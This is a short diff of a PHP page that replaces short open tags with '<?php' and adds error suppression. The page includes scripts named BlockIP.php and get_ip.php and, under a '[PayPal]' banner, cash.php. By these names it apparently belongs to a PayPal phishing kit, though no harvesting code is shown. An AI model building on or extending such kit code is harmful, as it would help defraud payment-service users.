@@ -1,6 +1,7 @@
-<?
+<?php
 
-session_start(); 
+session_start();
+error_reporting(0);
 ################### SECOND FILES #####################
 include('../../functions/BlockIP.php');
 
@@ -162,7 +163,7 @@ include('../../functions/get_ip.php');
                             <hr style="width: 80%;">
                             
 <!--==========================================[PayPal]============================================-->
-<?
+<?php
 include('cash.php');
 ?>
       
